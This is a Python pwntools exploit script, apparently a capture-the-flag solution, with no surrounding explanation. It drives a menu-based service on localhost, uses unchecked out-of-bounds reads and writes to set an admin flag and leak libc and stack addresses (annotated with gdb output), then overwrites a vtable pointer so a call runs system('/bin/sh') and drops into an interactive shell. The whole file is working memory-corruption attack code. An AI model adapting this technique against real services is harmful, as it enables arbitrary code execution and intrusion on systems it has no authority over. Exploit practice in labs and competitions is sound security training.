from pwn import *

p = remote('127.0.0.1', 8080)

_created_counter = 0

def create():
    global _created_counter
    _created_counter += 1

    # Create
    p.sendlineafter(b'Enter the choice:\n', b'1')
    if _created_counter == 1:
        # Local
        p.sendlineafter(b'Enter the choice:\n', b'3')
    else:
        # Boxed
        p.sendlineafter(b'Enter the choice:\n', b'1')
    # Size
    p.sendlineafter(b'Enter the size:\n', b'1024')
    # Read/write
    p.sendlineafter(b'Enter the choice:\n', b'3')

create()
create()

def write8(off, val, sl=0):
    # Write
    p.sendlineafter(b'Enter the choice:\n', b'3')
    # Slot
    p.sendlineafter(b'Enter the slot:\n', str(sl).encode())
    # Index
    p.sendlineafter(b'Enter the index:\n', str(off if off >= 0 else off + 2**64).encode())
    # Value
    p.sendlineafter(b'Enter the value:\n', str(val).encode())
    # Unwrap
    p.sendlineafter(b'Enter the choice:\n', b'1')

def read8(off):
    # Read
    p.sendlineafter(b'Enter the choice:\n', b'2')
    # Slot
    p.sendlineafter(b'Enter the slot:\n', b'0')
    # Index
    p.sendlineafter(b'Enter the index:\n', str(off if off >= 0 else off + 2**64).encode())
    # Unchecked
    p.sendlineafter(b'Enter the choice:\n', b'3')
    # Result
    p.recvuntil(b'Result: ')
    return int(p.recvline().decode().strip())

def write64(off, val):
    for i in range(0, 8):
        write8(off + i, (val >> i * 8) & 0xff)

def read64(off):
    res = 0
    for i in reversed(range(0, 8)):
        res = (res << 8) | read8(off + i)
    return res

# is_admin: 0x98(%rsp)
# local_data: 0xa8(%rsp)

write8(-16, 1)

# (gdb) x/20a $rsp
# 0x7ffe65eecac0:	0x5aeb2a9d9810 <_ZN3run4main17hf2eb20adc216d115E>	0x724b6fe6024a <__libc_start_call_main+122>
# 0x7ffe65eecad0:	0x7ffe65eecbc0	0x5aeb2a9db520 <main>
# 0x7ffe65eecae0:	0x12a9c3040	0x7ffe65eecbd8
# 0x7ffe65eecaf0:	0x7ffe65eecbd8	0x920e9a292183a1ec
# 0x7ffe65eecb00:	0x0	0x7ffe65eecbe8
# 0x7ffe65eecb10:	0x5aeb2aa1dd28	0x724b7007b020 <_rtld_global>
# 0x7ffe65eecb20:	0x6df251f4b421a1ec	0x769845e52585a1ec
# 0x7ffe65eecb30:	0x0	0x0
# 0x7ffe65eecb40:	0x0	0x7ffe65eecbd8
# 0x7ffe65eecb50:	0x7ffe65eecbd8	0x9bae95e730d0200
#
# (gdb) disp/i $pc
# 1: x/i $pc
# => 0x5aeb2a9dbe73 <_ZN3run6traits6CanPut13put_unchecked17hee53d1baa5fbab4bE+3>:	movzbl (%rcx,%rsi,1),%eax
# (gdb) p/a $rcx
# $3 = 0x7ffe65eec528
#
# (gdb) p __libc_system
# $4 = {int (const char *)} 0x724b6fe85490 <__libc_system>

in_libc = read64(0x7ffe65eecac8 - 0x7ffe65eec528)
system = in_libc + 0x724b6fe85490 - 0x724b6fe6024a

stack = read64(0x7ffe65eecaf0 - 0x7ffe65eec528)
base = stack + 0x7ffe65eec528 - 0x7ffe65eecbd8

vec = read64(-32)
data = read64(vec - base + 32)
vptr = read64(vec - base + 40)

write64(data - base, u64(b'/bin/sh\x00'))
write64(vec - base + 40, vec + 48 - 0x38)
write64(vec - base + 48, system)

write8(0, 0, 1)

p.interactive()
